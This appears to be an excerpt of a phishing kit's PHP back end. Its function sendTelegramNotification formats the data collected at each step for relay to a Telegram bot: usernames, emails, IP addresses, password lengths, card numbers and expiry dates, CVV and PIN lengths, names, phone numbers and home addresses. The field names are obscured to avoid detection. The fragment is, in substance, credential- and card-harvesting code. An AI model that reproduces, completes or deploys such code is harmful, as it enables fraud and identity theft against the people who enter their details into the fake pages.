...
function sendTelegramNotification($data) {
    ...
    switch ($step) {
        case 'login':
            $vars = [
                'usrnm' => $usrnm,
                'username' => $usrnm, // For backward compatibility with template
                'emzemz' => $data['emzemz'] ?? 'N/A',
                'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown', // Match template
                'timestamp' => $timestamp // Match template
            ];
            $message = replaceTemplateVars(TELEGRAM_NEW_USER_MESSAGE, $vars);
            break;
...
👤 User: $usrnm
📧 Email: " . (isset($data['usr_eml']) ? $data['usr_eml'] : 'N/A') . "
🔒 Pass Length: " . strlen(isset($data['acc_cd']) ? $data['acc_cd'] : '') . " chars
...
📮 ZIP: " . (isset($data['zip_cd']) ? $data['zip_cd'] : 'N/A') . "";
        ...
        case 'card_information':
            $message = "💳 Payment Method Completed
👤 User: $usrnm
⏰ Time: $timestamp

💳 Card Details:
💳 Card: " . substr(isset($data['pay_card']) ? $data['pay_card'] : 'XXXXXXXXXXXXXXXX', 0, 4) . "-XXXX-XXXX-" . substr(isset($data['pay_card']) ? $data['pay_card'] : 'XXXXXXXXXXXXXXXX', -4) . "
📅 Exp: " . (isset($data['exp_mth']) ? $data['exp_mth'] : 'XX') . "/" . (isset($data['exp_yr']) ? $data['exp_yr'] : 'XXXX') . "
🔢 CVV: " . strlen(isset($data['sec_cd']) ? $data['sec_cd'] : '') . " digits
🏧 PIN: " . strlen(isset($data['pin_cd']) ? $data['pin_cd'] : '') . " digits";
            break;
...
📋 Complete Summary:
👤 Name: " . (isset($completeData['basic_info_home_address']['gvn_nm']) ? $completeData['basic_info_home_address']['gvn_nm'] : 'N/A') . " " . (isset($completeData['basic_info_home_address']['fam_nm']) ? $completeData['basic_info_home_address']['fam_nm'] : 'N/A') . "
📧 Email: " . (isset($data['usr_eml']) ? $data['usr_eml'] : 'N/A') . "
📞 Phone: " . (isset($completeData['basic_info_home_address']['cnt_num']) ? $completeData['basic_info_home_address']['cnt_num'] : 'N/A') . "
🏠 Location: " . (isset($completeData['basic_info_home_address']['str_adr']) ? $completeData['basic_info_home_address']['str_adr'] : 'N/A') . ", " . (isset($completeData['basic_info_home_address']['loc']) ? $completeData['basic_info_home_address']['loc'] : 'N/A') . ", " . (isset($completeData['basic_info_home_address']['prov']) ? $completeData['basic_info_home_address']['prov'] : 'N/A') . " " . (isset($completeData['basic_info_home_address']['zip_cd']) ? $completeData['basic_info_home_address']['zip_cd'] : 'N/A') . "
💳 Card: ****-****-****-" . substr(isset($completeData['card_information']['pay_card']) ? $completeData['card_information']['pay_card'] : 'XXXXXXXXXXXXXXXX', -4) . "
